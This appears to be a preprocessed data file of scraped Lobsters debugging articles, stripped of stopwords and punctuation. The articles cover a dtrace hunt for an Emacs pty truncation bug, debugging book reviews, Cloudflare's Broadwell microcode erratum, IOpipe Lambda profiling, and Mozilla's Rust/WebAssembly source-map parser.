raspberry pi tier system raspberry pi sitting around collecting dust put use wrote image sd card day stretched leg new system cloned couple dozen git repository ran build test got feel thing tried port system first time mainly discover lowpowered raspberry pi take day build package want try mostly program vim day day even set emacs eventually build emacs clone configuration fire give elfeed spin search failed bug strike dozen time perfect lowpowered platform jackpot particular bug triggering left right given got dtrace disposal perfect place debug something lying elfeed dtrace play judge dive see three possibility curl reporting success truncating output emacs quietly truncating curl output emacs misinterpreting curl exit status dtrace observe every curl process writes emacs also double check curl exit status come following newbie dtrace script syscall write entry execname curl printf write n pid stringof copyin syscall exit entry execname curl printf exit dn pid execname curl predicate obviously cause behavior fire curl process first probe dtrace print line every write curl correspond argument write fd buf count log process id pid write length write actual content written remember curl process run parallel emacs pid allows associate separate writes exit status second probe print pid exit status first argument exit also want compare exactly delivered elfeed curl exit modify process sentinel callback handle subprocess exiting call writefile action taken compare buffer dump log produced dtrace two important finding first search failed bug occurs buffer completely empty time truncated end http header time right blank line dtrace indicates curl job full emacs liar delivering curl data elfeed pretty annoying second curl linebuffered line separate independent write certainly expecting normally c library line buffering output terminal guessing user may watching expecting output arrive line time sample looked like log write server ubuntu write location http blogplovercomindexatom write contentlength write contenttype texthtml write would curl think emacs terminal oh right problem ran four year ago writing emacsql default emacs connects subprocesses pseudoterminal pty called mistake emacs back still stand claim pty cause weird annoying problem little benefit interpreting control character hope transferring binary data subprocesses generally get line buffered make slower though situation might desirable stdout stderr get mixed together optional since emacs new bug somewhere emacs cause truncation ptys used heavily parallel eyeballing dtrace log knew dump pty switch pipe controlled processconnectiontype variable fixing oneliner completely resolve truncation issue elfeed noticeably faster fetching feed machine longer receiving mountain xml one line time like sucking pudding straw quite zippy even raspberry pi never case without search failed bug even never affected bug benefit fix officially reported emacs bug yet reproducibility still issue need something better fire bunch http request across internet parallel raspberry pi fix reminds old boilermaker story charging lot money swing hammer problem arose dtrace quickly helped identify place hit emacs hammer finally big thanks alphapapa originally taking time report bug month ago
355,Lobsters,debugging,Debugging,On battle scars and debugging,http://wozniak.ca/blog/2018/01/15/On-battle-scars-and-debugging/index.html,battle scar debugging,book review battle scar debugging,book review battle scar debugging first series essay debugging literature looking author written debugging noting common theme strategy shortcoming also reviewing text thorough fashion normal capsule review style new york review book comment amazon effective debugging specific way debug software system diomidis spinellis addisonwesley pp software exorcism handbook debugging optimizing legacy code bill blunden apress pp debugging application bugslayer guide finding fixing coding error microsoft windowsbased application john robbins microsoft press pp debugging one skill programmer absorb time nt seem taught much learned experience done book take stab providing concrete debugging information done want tell effective debugging concise useful three even written year ago would still better book spinellis nt wax poetic philosophic point whole text chapter describes tool technique approach added one debugging arsenal example tend short easy digest although familiar tool used make point helpful chapter veer trite pedantic territory thankfully nt stay long wager book still marginally useful year ageless debugging information said spinellis book could marginally useful future knock perhaps intent point although spinellis us general sounding chapter title prose inevitably dig detail particular language tool environment programming milieu change time utility detail diminish enough similarity described text reader using better chance relating text actual situation mean tool choice problem description debugging book tricky business want book runofthemill experience report thinking something like could still helpful year attempt complement spinellis advantage recent book hand software exorcism debugging application book least year old one probably wo nt find terribly helpful today interesting ground context sympathetic material consider zeitgiest time put bias front never developed window meaningful capacity know development environment name cursory knowledge window system made effort master window mind admit read robbins book read first quarter skimmed rest vast majority detail use navigation window development tool mid late running window nt operating system barely use today copious code example mostly c minefield incompatibility give flavour content nearly page devoted describing use c visual basic debugger page code listing visual basic unit testing tool debugging application timeless book much grounded window development environment day kind book textbook publisher love demand new version every year stay relevant software exorcism timeless either try general advice pertinent also deeply cynical blunden writes wronged witnessed workplace treachery regular basis fair bit advice keeping paper trail blamed something show one pointing finger actually one fault also section countermeasure remedy presented recognize way could defeated code sample cc geared toward window generally interesting advice nothing nt said time ca nt deny wanted read spurred desire understand mindset author content curiously book spend entire chapter describing debugger work actually implementing one using window apis surprise know neither exercise produced debugger reader would want use actual debugging although robbins come close making something skirt periphery utility furthermore nt even tackle interesting part debugger like walking stack dealing symbol table done using partially documented window apis demonstrate breakpoints singlestepping explaining certainly nt require full application especially since window apis work although robbins dive deep detail blunden nt exactly break new ground supply perspective act debugging advice framed within time period written perspective advice bad even compelling time prescribe similar practice albeit different perspective robbins take managerial view advises one use bug tracker version control set aside time debug build get build hand qa soon possible build test frequently bear mind agile consultant started burrowing organization clear tenents agile development present although specific nt fit today practice spirit certainly uncharitable view take whilst reading planning assume kind horrific waterfall model perhaps strict adherance gantt chart mention planning mean robbins description good rhetorical device elevates tedious explanation thing window said advice defensive programming banal assert trace comment striking much effort made supply technique enhance read work around limitation development environment time example large portion text devoted make assertion better visual studio opposite blunden aside sharp cynicism blunden talking reader like faction maintenance developer core practice today present unit testing incremental refinement expectation change written time web application starting get noticed since book legacy code based year experience noteworthy principle seem think originated web certainly known advice defensive programming would expect low coupling high cohesion verify input document wisely avoid globals nothing sane person would dispute tone content give book flavour alluded earlier lot code padding robbins blunden work code necessary defense consider popular way demonstrating tool today screencastsvideos emulate interactive session text take lot line screencasts popular way demoing tool use nicely compress information certainly time showing code greatly help demonstrate point debugging application software exorcism written good framework logging unit testing readily known available understandable would include code demonstrating one must grant leniency criticism literary code bloat nevertheless still code bloat code example stretch couple page pushing reader patience taking page tossing onto crag sure point lode code reader study transcribe either way losing proposition spinellis avoids luxury able use link github repository modern day equivalent shipping cd book added task maintenance may reduce size book ignored example small enough transcribing arguably instructional book specific debugging strategy aim impart experience stay sane survive documentation successfully running gauntlet pull reader sympathy keep via empathy strength connection weakness information gauntlet run one run job extract lesson experience
356,Lobsters,debugging,Debugging,However improbable: The story of a processor bug,https://blog.cloudflare.com/however-improbable-the-story-of-a-processor-bug/,however improbable story processor bug,meltdown spectre vulnerability image prologue disclosed security problem crash technical term page fault implementation trick make efficient magnetic core memory cc bysa image cosmic ray quest solution issue intel skylake processor memory management unit solution intel xeon intel specification update recent microcode update address spectre vulnerability conclusion join team,processor problem news lately due meltdown spectre vulnerability generally engineer writing software assume computer hardware operates reliable wellunderstood fashion problem lie software side softwarehardware divide modern processor chip routinely execute many billion instruction second erratic behaviour must hard trigger would quickly become obvious sometimes assumption reliable processor hardware hold last year cloudflare affected bug one intel processor model story found mysterious problem tracked cause image alterego prologue back february cloudflare disclosed security problem became known cloudbleed bug behind incident lay code ran server parse html certain case involving invalid html parser would read data region memory beyond end buffer parsed adjacent memory might contain customer data would returned http response result cloudbleed consequence bug sometimes could lead invalid memory read causing nginx process crash metric showing crash week leading discovery cloudbleed one measure took prevent problem happening require every crash investigated detail acted swiftly address cloudbleed ended crash due bug stop crash set work investigating crash crash technical term exactly crash mean context processor detects attempt access invalid memory precisely address without valid page page table signal page fault operating system kernel case linux page fault result delivery sigsegv signal relevant process name sigsegv derives historical unix term segmentation violation also known segmentation fault segfault default behaviour sigsegv terminate process abrupt termination one symptom cloudbleed bug possibility invalid memory access resulting termination mostly relevant process written c c higherlevel compiled language go jvmbased language use type system prevent kind lowlevel programming error lead access invalid memory furthermore language sophisticated runtimes take advantage page fault implementation trick make efficient process install signal handler sigsegv get terminated instead recover situation interpreted language python interpreter check condition leading invalid memory access occur unhandled sigsegv signal tend restricted programming c c sigsegv signal indicates error process cause termination also saw process termination due sigabrt sigill suggesting kind bug code information terminated nginx process signal involved investigating cause would difficult another feature linux unixderived operating system provided path forward core dump core dump file written operating system process terminated abruptly record full state process time terminated allowing postmortem debugging state recorded includes processor register value thread process value program variable held register content process conventional memory region giving value program variable heap data description region memory readonly mapping file executables shared library information associated signal caused termination address attempted memory access led sigsegv core dump record state size depends upon program involved fairly large nginx core dump often several gigabyte core dump recorded inspected using debugging tool gdb allows state core dump explored term original program source code inquire program stack content variable heap reasonably convenient manner brief aside core dump called core dump historical term originated principal form random access memory magnetic core memory time word core used shorthand memory core dump mean dump content memory cc bysa image konstantin lanzet examined core dump able track back bug code none leaked data cloudbleed security implication customer might allowed attacker try impact service core dump suggested bug triggered innocuous condition rather attack fix many bug number core dump produced dropped significantly still core dump produced server one day across whole fleet server finding root cause remaining one proved difficult gradually began suspect residual core dump due bug code suspicion arose found case state recorded core dump seem possible based program code examining case rely c code looked machine code produced compiler case dealing compiler bug first discussed core dump among engineer cloudflare healthy scepticism idea cause might lie outside code least one joke cosmic ray amassed example became clear something unusual going finding yet another mystery core dump taken calling became routine although detail core dump diverse code triggering spread throughout code base common feature apparent impossibility obvious pattern server produced mystery core dump getting one day average across fleet server sample size big seemed evenly spread across server datacenters one server struck twice probability individual server would get mystery core dump seemed low one per ten year server uptime assuming indeed equally likely server large number server got steady trickle quest solution rate mystery core dump low enough appreciably impact service customer still committed examining every core dump occurred although got better recognizing mystery core dump investigating classifying drain engineering resource wanted find root cause fix started consider cause seemed somewhat plausible looked hardware problem memory error particular real possibility server use ecc errorcorrecting code memory detect case correct memory error occur furthermore memory error recorded ipmi log server see memory error server fleet correlated core dump memory error could problem processor hardware mostly use intel xeon processor various model good reputation reliability rate core dump low seemed like might high attributed processor error searched report similar issue asked grapevine hear anything seemed match issue investigating issue intel skylake processor came light time skylakebased server production furthermore issue related particular code pattern common feature mystery core dump maybe core dump incorrectly recorded linux kernel mundane crash due bug code ended looking mysterious see pattern core dump pointed something like also upon unhandled sigsegv kernel generates log line small amount information cause like segfault ip sp error nginxfl checked log line core dump always consistent kernel role controlling processor memory management unit provide virtual memory application program kernel bug area lead surprising result encountered bug cloudflare different context examined kernel code searched report relevant bug linux without finding anything several week effort find cause fruitful due low frequency mystery core dump considered perserver basis follow usual lastresort approach problem solving changing various possible causative factor hope make problem le likely occur needed another lead solution eventually noticed something crucial missed point mystery core dump came server containing intel xeon model belongs generation intel processor codename broadwell model generation use edge server simply call server broadwells broadwells made third fleet time many datacenters explains pattern immediately obvious insight immediately threw focus investigation back onto possibility processor hardware issue downloaded intel specification update model specification update document intel discloses way processor deviate published specification whether due benign discrepancy bug hardware intel entertainingly call erratum specification update described issue obscure issue interest mainly developer bios operating system one caught eye hyperthreading technology enabled processor may exhibit internal parity error unpredictable system behavior symptom described issue broad unpredictable system behavior may occur observing seemed match description issue better furthermore specification update stated fixed microcode update microcode firmware control lowestlevel operation processor updated bios system vendor o microcode update change behaviour processor extent exactly much closelyguarded secret intel although recent microcode update address spectre vulnerability give idea impressive degree intel reconfigure processor behaviour convenient way u apply microcode update broadwell server time via bios update server vendor rolling bios update many server many data center take planning time conduct due low rate mystery core dump would know really root cause problem significant fraction broadwell server updated couple week keen anticipation followed awaited outcome great relief update completed mystery core dump stopped chart show number core dump getting day relevant month see microcode update marked reduction rate core dump still get core dump mystery represent conventional issue software continue investigate fix ensure represent security issue service conclusion eliminating mystery core dump made easier focus remaining crash due code remove temptation dismiss core dump cause obscure core dump see understanding cause challenging correspond unlikely condition often involve root cause distant immediate issue triggered core dump example see segfaults luajit embed nginx via openresty due problem luajit rather luajit particularly susceptible damage data structure bug unrelated c code excited core dump detective work building system scale onceinadecade problem get triggered every day join team
357,Lobsters,debugging,Debugging,Using IOpipe profiling to gain crucial observability into your AWS Lambda functions,https://read.iopipe.com/using-iopipe-profiling-to-gain-crucial-observability-into-your-aws-lambda-functions-506f5dda6bdf,using iopipe profiling gain crucial observability aws lambda function,including configuring iopipe profiling plugin including profiling plugin activate viewing iopipe profiling data cpu usage invocation flame chart call stack thing keep mind iopipe profiling like cpu profiling effect performance right profiling supported nodejs moment beta customer paid iopipe plan sign community slack channel,super excited dig newest feature tool give better glimpse serverless function like one sure make user life easier increased ease experience deployment operation serverless quickly paired tradeoff lose transparency hard get visibility back new profiling feature important able see cpu profiling data lambda function time iteration key ability diagnose problem identify solution quicklyknowing aws lambda function cpu usage critical diagnosing problem scaling cost also factor profiling data show need push pull cpu allocation function help save money show aws lambda application need scaleour new feature allows see cpu profiling entire aws lambda code base adding line code function iopipe dashboard see download link file loaded chrome devtools present flame graph representing cpu statistic label set glance able determine part aws lambda function take time cpua look profiling data iopipelet take look implementation use profiling best way know diving code including configuring iopipe profiling pluginin order include iopipe profiling plugin nodejs aws lambda function need require iopipeprofiler order module loaded tell main iopipe library wish use plugin configuration look lot like configuration option profiling plugin enabled including profiling plugin activate need set true order receive profiling data aws lambda application also configure environment variable iopipeenableprofilingtruesamplerate finetune number sample taken application default fairly granular usdebug option give ability see debug log case want see data profiler run set false defaultonce included configured profiling plugin run start see iopipe profiling data right away well kind start see download link invocation let walk opening deciphering data viewing iopipe profiling datayou see download link profiling data setting plugin order view data need open chrome devtools javascript profiler tab see click three vertical dot upper right corner tool import file clicking load finding cpuprofile file downloadedonce done see flame chart breakdown everything lambda function via cpu stack trace lot process let break basic data getwhat iopipe profiling data tell aws lambda functionscpu usage invocation handy chart show spike cpu usage aws lambda function giving overview resource utilization function invocation timeflame chart show executing aws lambda function great diagnosing everything error moving pinning race condition call stack even drill call stack see exactly called sorry profiling technology still tell need see exactly going instant place even select tree view go topdown heavy go take bottomup approachthings keep mindiopipe profiling like cpu profiling effect performance highly recommend use application strictly developmentcycle tool forego running productionside aws lambda functionsright profiling supported nodejs make sure keep updated add functionality language moment beta customer paid iopipe plan announcing information rollout move forwardif like try iopipe got free trial commitment sign want connect team participate feedback session general question peep u community slack super excited adding feature debugging aws lambda function get tricky happy bring tool bring clarity perspective development process keep eye future development
358,Lobsters,debugging,Debugging,Oxidizing Source Maps with Rust and WebAssembly,https://hacks.mozilla.org/2018/01/oxidizing-source-maps-with-rust-and-webassembly/,oxidizing source map rust webassembly,edit faster speed without wizardry tom tromey time faster background source map format source map format dwarf extended backusnaur form ebnf javascript library library npm firefox developer tool team time per week modified procedure changed single base digit decoding function return failure jitcoach shape hidden class another performance improvement implemented quicksort javascript webassembly webassembly planned future within rust rust parsing querying source map rust suite property test rust implementation parsing querying available cratesio crate base variable length quantity library string interfacing javascript exposing webassembly apis rust compiling rust file postbuild pipeline using webassembly apis javascript raii benchmark source map minifiedtounminified uglifyjs latest angularjs minifiedtounminified source map scalajs runtime scalatojavascript source map benchmark lower value better setting breakpoint first time relative standard deviation pausing exception first time subsequent breakpoints pause exception iterating mapping code size google closure compiler conclusion future work homegrown script postprocess pull request adding webassembly implementation library process merging tom tromey aaron turon alex crichton benjamin bouvier jeena lee jim blandy lin clark luke wagner mike cooper till schneidereit transpiler spidermonkey us selfhosted javascript implementation custom comparator function c implementation overhead call webassembly javascript mostly disappear firefox bug land,edit algorithmic improvement yielded additional speedup described total speedup faster original implementation read extra gain speed without wizardry tom tromey replaced performancesensitive portion sourcemap javascript library source map parser rust code compiled webassembly webassembly time faster javascript implementation realistic benchmark operating real world source map additionally performance also consistent relative standard deviation decreased removed javascript code written convoluted unidiomatic way name performance replaced idiomatic rust code performs even better hope sharing experience inspire others follow suit rewrite performancesensitive javascript rust via webassembly background source map format source map format provides bidirectional mapping location generated javascript code emitted compiler minifier package bundling tool back location original source programmer authored javascript developer tool use source map symbolicate backtraces implement sourcelevel stepping debugger source map encode debug information similar found dwarf debugline section source map json object handful field mapping field string make bulk source map contains bidirectional mapping source object location describe mapping string grammar extended backusnaur form ebnf mapping grouped generated javascript line number incremented every time semicolon lay individual mapping consecutive mapping generated javascript line separated comma mapping generatedline mapping generatedline mapping mapping generatedline individual mapping location generated javascript optionally location original source text might also contain associated name mapping generatedcolumn source originalline originalcolumn name every component mapping variable length quantity vlq encoded integer filename associated name encoded index side table stored field source map json object every value relative last occurrence type ie given source value delta since previous source value delta tend smaller absolute value mean compact encoded generatedcolumn vlq source vlq originalline vlq originalcolumn vlq name vlq character vlq drawn set printable ascii character comprising upper lowercase letter decimal digit symbol character represents particular value significant bit set last character vlq remaining five bit prepended integer value represented rather attempting translate definition ebnf provide pseudocode parsing decoding single vlq constant shift constant continuationbit shift constant mask shift decodevlq input let accumulation let shift let nextdigitpartofthisnumber true nextdigitpartofthisnumber let character rest input let digit character accumulation digit mask shift shift shift nextdigitpartofthisnumber digit continuationbit input rest let isnegative accumulation let value accumulation isnegative return value input else return value input sourcemap javascript library sourcemap library published npm maintained firefox developer tool team mozilla one transitively dependedupon library javascript community downloaded time per week like many software project sourcemap library written first correctness later modified improve performance time seen good amount performance work consuming source map majority time spent parsing mapping string constructing pair array one sorted generated javascript location sorted original source location query use binary search appropriate array parsing sorting happen lazily occur particular query requires allows debugger list source example without needing parse sort mapping parsed sorted querying tends performance bottleneck vlq decoding function take string input par decodes vlq string return pair value rest input consumed function originally written idiomatic referentially transparent style return pair object literal two property function decodevlqbefore input return result rest returning pair way found costly javascript justintime jit compiler optimized compilation tier unable eliminate allocation vlq decoding routine called frequently allocation creating undue pressure garbage collector leading frequent garbage collection pause remove allocation modified procedure take second parameter object get mutated serf parameter rather returning freshly allocated object parameter property overwritten way could reuse object every vlq parse le idiomatic much performant function decodevlqafter input outresult result outrest rest reaching unexpected endofstring invalid base character vlq decoding function would throw error found javascript jits would emit faster code changed single base digit decoding function return failure instead throwing error le idiomatic improved performance profiling spidermonkey jitcoach prototype found spidermonkey jit using slowpath polymorphic inline cache object property get set mapping object jit emitting desired fastpath code direct object slot access detecting common shape hidden class shared mapping object property would added different order omitted completely example associated name mapping creating constructor mapping object initialized every property would ever use helped jit create common shape mapping object resulted another performance improvement function mapping thisgeneratedline thisgeneratedcolumn thislastgeneratedcolumn null thissource null thisoriginalline null thisoriginalcolumn null thisname null sorting two mapping array use custom comparator function sourcemap library first written spidermonkey arrayprototypesort implemented c performance however sort passed explicit comparator function large array sorting code must call comparator function many time call c javascript relatively expensive passing custom comparator function made sort perform poorly avoid implemented quicksort javascript avoided ctojavascript call also let javascript jits inline comparator function sorting function enabling optimization brought u another large performance boost made code le idiomatic webassembly webassembly new lowlevel architectureindependent byte code developed web designed safe efficient execution compact binary developed open web standard supported major web browser webassembly expose stack machine map well onto modern processor architecture instruction operate large linear buffer memory support garbage collection although extending work garbagecollected javascript object planned future control flow structured rather allowing arbitrary jump label designed deterministic consistent even different architecture diverge edge case outofrange shift overflow canonicalizing nan webassembly aim match beat native execution speed currently within native execution benchmark lack garbage collector language target webassembly currently limited language without runtime garbage collector speak unless collector runtime also compiled webassembly happen practice right language developer actually compiling webassembly c c rust rust rust system programming language emphasizes safety speed provides memory safety without relying garbage collector instead statically track ownership borrowing resource determine emit code run destructors free memory rust great position compiling webassembly since rust require garbage collection rust author jump extra hoop target webassembly rust many goody web developer come expect c c lack parsing querying source map rust decided rewrite hot portion source map parsing querying rust decide boundary javascript webassembly emitted rust compiler would crossing boundary javascript jited code webassembly back currently imposes overhead similar ctojavascript call mentioned earlier important place boundary minimize number time cross poor choice place boundary webassembly javascript would vlq decoding function vlq decoding function invoked one four time every mapping encoded mapping string therefore would cross javascripttowebassembly boundary many time parsing instead decided parse whole mapping string rustwebassembly keep parsed data webassembly heap owns parsed data queryable form mean never copy data webassembly heap would involve crossing javascriptwebassembly boundary often instead cross boundary way every query plus way every mapping result query query tend produce single result perhaps handful confidence rust implementation correct ensure new implementation passed sourcemap library existing test suite also wrote suite quickcheck property test test construct random mapping input string parse assert various property hold rust implementation mapping parsing querying available cratesio sourcemapmappings crate base variable length quantity first step parsing source map mapping decoding vlqs implemented vlq library rust published cratesio function decodes single base digit us pattern matching idiomatic resultstyle error handling result e either ok v indicating operation succeeded produced value v type err error indicating operation failed value error type e providing detail function return type result error indicates return value success vlq error value failure fn input result error match input b b z ok input b b b z ok input b b b ok input b b ok b ok err error input function hand decode whole vlq value decode function take mutable reference iterator byte input consumes many byte need decode vlq finally return result decoded value pub fn decode b input mut b result b iterator item let mut accum let mut shift let mut keepgoing true keepgoing let byte inputnext okor error unexpectedeof let digit byte keepgoing digit continued let digitvalue digit mask checkedshl shift okor error overflow accum accumcheckedadd digitvalue okor error overflow shift shift let absvalue accum absvalue max return err error overflow low bit hold sign accum ok absvalue else ok absvalue unlike javascript code replacing code sacrifice idiomatic error handling performance idiomatic error handling performant involve boxing value heap unwinding stack mapping string begin defining small helper function ismappingseparator predicate function return true given byte separator mapping false nearly identical javascript function inline fn ismappingseparator byte bool byte b byte b next define helper function reading single vlq delta value adding previous value javascript equivalent function instead repeat code time want read vlq delta javascript let u control parameter represented memory rust pas reference number zerocost manner javascript could pas reference object number property could close number variable local closure function solution associated runtime cost inline fn readrelativevlq b previous mut input mut b result error b iterator item let decoded vlq decode input let new overflowed previous overflowingadd decoded overflowed new max return err error unexpectedlybignumber new return err error unexpectednegativenumber previous new ok rust implementation mapping parsing quite similar javascript implementation replaces however rust control boxed whereas javascript every single parsed mapping object boxed javascript implementation much rust implementation advantage stem avoiding allocation associated garbage collection pub fn parsemappings input result mapping error let mut generatedline let mut generatedcolumn let mut originalline let mut originalcolumn let mut source let mut name let mut mapping mapping default let mut bygenerated vec let mut input inputiter cloned peekable let byte inputpeek cloned match byte b generatedline generatedcolumn inputnext unwrap b inputnext unwrap let mut mapping mapping default mappinggeneratedline generatedline readrelativevlq mut generatedcolumn mut input mappinggeneratedcolumn generatedcolumn let nextissep inputpeek cloned mapor true ismappingseparator mappingoriginal nextissep none else readrelativevlq mut source mut input readrelativevlq mut originalline mut input readrelativevlq mut originalcolumn mut input let nextissep inputpeek cloned mapor true ismappingseparator let name nextissep none else readrelativevlq mut name mut input name originallocation source originalline originalcolumn name bygeneratedpush mapping quicksort comparators bygeneratedlocation mut bygenerated mappingsbygenerated bygenerated ok mapping finally still use custom quicksort implementation rust code unidiomatic thing rust code found although standard library builtin sorting much faster targeting native code custom quicksort faster targeting webassembly surprising investigated interfacing javascript webassembly foreign function interface ffi constrained scalar value function exposed rust javascript via webassembly may use scalar value type parameter return type therefore javascript code must ask rust allocate buffer space mapping string return pointer buffer next javascript must copy mapping string buffer without crossing ffi boundary write access whole webassembly linear memory buffer initialized javascript call parsemappings function returned pointer parsed mapping javascript perform number query webassembly api passing pointer parsed mapping finally query made javascript tell webassembly free parsed mapping exposing webassembly apis rust webassembly apis expose live small glue crate wrap sourcemapmappings crate separation useful allows u test sourcemapmappings crate native host target compile webassembly glue targeting webassembly addition constraint type cross ffi boundary exported function requires nomangle attribute namemangled javascript easily call marked extern c publicly exported final wasm file unlike core library glue code expose functionality javascript via webassembly necessity frequently use unsafe calling extern function using pointer received across ffi boundary always unsafe rust compiler verify safety side ultimately le concerning webassembly might target worst trap cause error raised javascript side return incorrect answer much tamer worst case scenario native binary executable memory address space writable memory attacker trick program jumping memory inserted shell code simplest function export function get last error occurred library provides similar functionality errno libc called javascript api call fails javascript would like know kind failure always maintain recent error global function retrieves error value static mut lasterror option error none nomangle pub extern c fn getlasterror unsafe match lasterror none e e first interaction javascript rust allocating buffer space hold mapping string desire owned contiguous chunk suggests using vec want expose single pointer javascript single pointer cross ffi boundary easier wrangle javascript side either add layer indirection box vec save extra data needed reconstruct vector side choose latter approach vector triple pointer heapallocated element capacity allocation length initialized element since exposing pointer heapallocated element javascript need way save length capacity reconstruct vec demand allocate two extra word space store length capacity first two word heap element give javascript pointer space extra word nomangle pub extern c fn allocatemappings size usize mut make sure nt lose byte size remainder let sizeinunitsofusize size mem sizeof usize mem sizeof usize make room two additional usize stuff capacity length let mut vec vec usize vec withcapacity sizeinunitsofusize stuffing let capacity veccapacity vecpush capacity vecpush size leak vec element get pointer let ptr vecasmutptr debugassert ptrisnull mem forget vec advance pointer past stuffed data return j j write mapping string let ptr ptrwrappingoffset mut assertpointeriswordaligned ptr ptr initializing buffer mapping string javascript pass ownership buffer parsemappings par string queryable structure pointer queryable mapping structure returned null kind parse failure first thing parsemappings must recover vec length capacity next construct slice mapping string data constrains lifetime slice current scope double check access slice deallocated call library mapping string parsing function regardless whether parsing succeeded deallocate buffer holding mapping string return pointer parsed structure save error may occurred return null force reference lifetime match scope lifetime certain unsafe operation dereferencing raw pointer return reference unconstrained lifetime use function ensure ca nt accidentally use reference become invalid inline fn constrain scope reference sized reference nomangle pub extern c fn parsemappings mapping mut mut mapping assertpointeriswordaligned mapping let mapping mapping mut usize unstuff data put pointer mapping string let capacityptr mappingswrappingoffset debugassert capacityptrisnull let capacity unsafe capacityptr let sizeptr mappingswrappingoffset debugassert sizeptrisnull let size unsafe sizeptr construct input slice pointer parse mapping let result unsafe let input slice fromrawparts mapping const size let thisscope let input constrain thisscope input sourcemapmappings parsemappings input deallocate mapping string two prefix word let sizeinusizes size mem sizeof usize mem sizeof usize unsafe vec usize fromrawparts capacityptr sizeinusizes capacity return result saving error side later inspection j required match result ok mapping box intoraw box new mapping err e unsafe lasterror e ptr nullmut run query need way translate result across ffi boundary result query either single mapping set many mapping mapping cross ffi boundary asis unless box wish box mapping since would also need provide getters field causing code bloat top cost allocation indirection solution call imported function mapping query result mappingscallback extern function without definition translates imported function webassembly javascript must provide instantiating webassembly module mappingscallback take mapping exploded member part field transitively flattened mapping translated parameter cross ffi boundary option member add bool parameter serf discriminant determining whether option none therefore whether following parameter valid garbage extern c fn mappingcallback two parameter always valid generatedline generatedcolumn lastgeneratedcolumn parameter valid haslastgeneratedcolumn true haslastgeneratedcolumn bool lastgeneratedcolumn source originalline originalcolumn parameter valid hasoriginal true hasoriginal bool source originalline originalcolumn name parameter valid hasname true hasname bool name inline unsafe fn invokemappingcallback mapping mapping let generatedline mappinggeneratedline let generatedcolumn mappinggeneratedcolumn let haslastgeneratedcolumn lastgeneratedcolumn let lastgeneratedcolumn mappinglastgeneratedcolumn true lastgeneratedcolumn else false let hasoriginal source originalline originalcolumn hasname name let original mappingoriginalasref let hasname name let name originalname true name else false true originalsource originaloriginalline originaloriginalcolumn hasname name else false false mappingcallback generatedline generatedcolumn haslastgeneratedcolumn lastgeneratedcolumn hasoriginal source originalline originalcolumn hasname name exported query function similar structure begin converting raw mut mapping pointer mut mapping mutable reference mut mapping lifetime constrained current scope enforce used function call saved away somewhere might used deallocated next exported query function forward query corresponding mapping method resulting mapping exported function invokes mappingcallback typical example exported allgeneratedlocationsfor query function wrap mapping allgeneratedlocationsfor method find mapping corresponding given original source location inline unsafe fn mappingsmut scope mapping mut mapping mut mapping mappingsasmut unwrap nomangle pub extern c fn allgeneratedlocationsfor mapping mut mapping source originalline hasoriginalcolumn bool originalcolumn let thisscope let mapping unsafe mappingsmut thisscope mapping let originalcolumn hasoriginalcolumn originalcolumn else none let result mappingsallgeneratedlocationsfor source originalline originalcolumn result unsafe invokemappingcallback finally javascript finished querying mapping must deallocate exported freemappings function nomangle pub extern c fn freemappings mapping mut mapping unsafe box fromraw mapping compiling rust wasm file addition target make compiling rust webassembly possible rustup make installing rust compiler toolchain targeting easy rustup update rustup target add compiler difference building host platform webassembly target flag cargo build release target resulting wasm file although working wasm file finished wasm file still much larger need produce smallest wasm file leverage following tool wasmgc like linker gcsections flag remove unused object file section wasm file instead elf macho etc object file find function transitively reachable exported function remove wasm file wasmsnip used replace webassembly function body single unreachable instruction useful manually removing function never called runtime compiler wasmgc statically prove unreachable snipping function make function statically unreachable make sense run wasmgc afterwards wasmopt run binaryen optimization pass wasm file shrinking size improving runtime performance eventually llvm webassembly backend matures may longer necessary postbuild pipeline go wasmgc wasmsnip wasmgc wasmopt using webassembly apis javascript first concern using webassembly javascript load wasm file sourcemap library primarily used three environment nodejs web inside firefox developer tool different environment different method loading wasm file byte arraybuffer compiled javascript runtime web inside firefox use standard fetch api make http request load wasm file library consumer responsibility provide url pointing wasm file parsing source map used nodejs library us fsreadfile api read wasm file disk initialization required parsing source map scenario provide uniform interface regardless environment library loaded using feature detection select correct wasm loading implementation compiling instantiating webassembly module must provide mappingcallback callback change across lifetime instantiated webassembly module depending kind query performing want different thing resulting mapping actual mappingcallback provide responsible translating exploded mapping member structured object trampolining result closure function set depending query running let currentcallback null webassemblyinstantiate buffer env mappingcallback function generatedline generatedcolumn haslastgeneratedcolumn lastgeneratedcolumn hasoriginal source originalline originalcolumn hasname name const mapping new mapping mappinggeneratedline generatedline mappinggeneratedcolumn generatedcolumn haslastgeneratedcolumn mappinglastgeneratedcolumn lastgeneratedcolumn hasoriginal mappingsource source mappingoriginalline originalline mappingoriginalcolumn originalcolumn hasname mappingname name currentcallback mapping make setting unsetting currentcallback ergonomic define withmappingcallback helper take two function one set currentcallback another invoke immediately second function execution finish reset currentcallback null javascript equivalent raii function withmappingcallback mappingcallback f currentcallback mappingcallback try f finally currentcallback null recall javascript first task parsing source map tell webassembly allocate space mapping string copy string allocated buffer const size mappingsstringlength const mappingsbufptr thiswasmexportsallocatemappings size const mappingsbuf new thiswasmexportsmemorybuffer mappingsbufptr size let size mappingsbuf mappingsstringcharcodeat javascript initialized buffer call exported parsemappings webassembly function translates failure error get thrown const mappingsptr thiswasmexportsparsemappings mappingsbufptr mappingsptr const error thiswasmexportsgetlasterror let msg error parsing mapping code error xxx keep error code sync fitzgensourcemapmappings switch error case msg mapping contained negative line column source index name index break case msg mapping contained number larger break case msg reached eof middle parsing vlq break case msg invalid base character parsing vlq break default msg unknown error code break throw new error msg thismappingsptr mappingsptr various query method call webassembly similar structure like exported function rust side validate query parameter set temporary mapping callback closure withmappingcallback aggregate result call webassembly return result allgeneratedpositionsfor look like javascript basicsourcemapconsumerprototypeallgeneratedpositionsfor function source line column const hascolumn column undefined column column source thisfindsourceindex source source return originalline throw new error line number must originalcolumn throw new error column number must const result thiswasmwithmappingcallback let lastcolumn mlastgeneratedcolumn thiscomputedcolumnspans lastcolumn null lastcolumn infinity resultspush line mgeneratedline column mgeneratedcolumn lastcolumn thiswasmexportsallgeneratedlocationsfor thisgetmappingsptr source line hascolumn column return result javascript done querying source map library consumer call sourcemapconsumerprototypedestroy call exported freemappings webassembly function basicsourcemapconsumerprototypedestroy function thismappingsptr thiswasmexportsfreemappings thismappingsptr thismappingsptr benchmark test performed macbook pro mid ghz intel core processor gb mhz memory laptop plugged power every test benchmark webpage refreshed test test performed chrome canary firefox nightly safari benchmark warm browser jit compiler performed five iteration collecting timing warm recorded timing iteration used variety input source map benchmark used three source map found wild varying size source map minifiedtounminified version 